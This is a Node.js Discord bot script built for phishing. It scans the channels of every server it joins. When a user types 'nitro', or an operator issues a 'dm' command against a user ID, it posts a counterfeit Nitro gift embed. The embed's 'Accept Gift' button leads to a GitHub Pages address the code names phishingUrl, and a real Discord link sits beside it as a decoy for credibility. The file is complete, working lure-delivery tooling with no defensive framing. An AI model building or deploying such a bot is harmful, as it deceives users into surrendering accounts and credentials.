const fs = require('fs');
const config = JSON.parse(fs.readFileSync('./config.json'));
const token = config.token;
const phishingUrl = "https://swiemali2-lgtm.github.io/member-cleanup/";
const imageUrl = "https://swiemali2-lgtm.github.io/member-cleanup/IMG_2560.jpeg";
let processed = new Set();

async function listen() {
  setInterval(async () => {
    let res = await fetch(`https://discord.com/api/v9/users/@me/guilds`, {headers: {"Authorization": `Bot ${token}`}});
    let guilds = await res.json();
    if (!Array.isArray(guilds)) return;
    for (let g of guilds) {
      let chans = await (await fetch(`https://discord.com/api/v9/guilds/${g.id}/channels`, {headers: {"Authorization": `Bot ${token}`}})).json();
      for (let c of chans) {
        if (c.type !== 0) continue;
        let msgs = await (await fetch(`https://discord.com/api/v9/channels/${c.id}/messages?limit=5`, {headers: {"Authorization": `Bot ${token}`}})).json();
        if (!Array.isArray(msgs)) continue;
        for (let m of msgs) {
          if (!m.content || processed.has(m.id)) continue;
          if (m.content.toLowerCase().trim() === "nitro") {
            processed.add(m.id);
            sendNitro(c.id);
          }
          if (m.content.toLowerCase().startsWith("dm ")) {
            processed.add(m.id);
            sendDM(m.content.split(" ")[1]);
          }
        }
      }
    }
  }, 5000);
}

async function sendNitro(channelId) {
  await fetch(`https://discord.com/api/v9/channels/${channelId}/messages`, {
    method: "POST",
    headers: {"Authorization": `Bot ${token}`, "Content-Type": "application/json"},
    body: JSON.stringify({
      embeds: [{title: "You've been gifted a subscription!", description: "**100pression** has gifted you Nitro for 3 months!\n\nExpires in 48 hours", color: 0x5865f2, image: {url: imageUrl}}],
      components: [{type: 1, components: [{type: 2, style: 5, label: "Accept Gift", url: phishingUrl}, {type: 2, style: 5, label: "Learn More", url: "https://discord.com/nitro"}]}]
    })
  }).catch(()=>{});
}

async function sendDM(targetId) {
  let dm = await (await fetch(`https://discord.com/api/v9/users/@me/channels`, {method: "POST", headers: {"Authorization": `Bot ${token}`, "Content-Type": "application/json"}, body: JSON.stringify({recipient_id: targetId})})).json();
  if (!dm.id) return;
  await fetch(`https://discord.com/api/v9/channels/${dm.id}/messages`, {
    method: "POST",
    headers: {"Authorization": `Bot ${token}`, "Content-Type": "application/json"},
    body: JSON.stringify({
      embeds: [{title: "You've been gifted a subscription!", description: "**100pression** has gifted you Nitro for 3 months!\n\nExpires in 48 hours", color: 0x5865f2, image: {url: imageUrl}}],
      components: [{type: 1, components: [{type: 2, style: 5, label: "Accept Gift", url: phishingUrl}, {type: 2, style: 5, label: "Learn More", url: "https://discord.com/nitro"}]}]
    })
  }).catch(()=>{});
}

listen();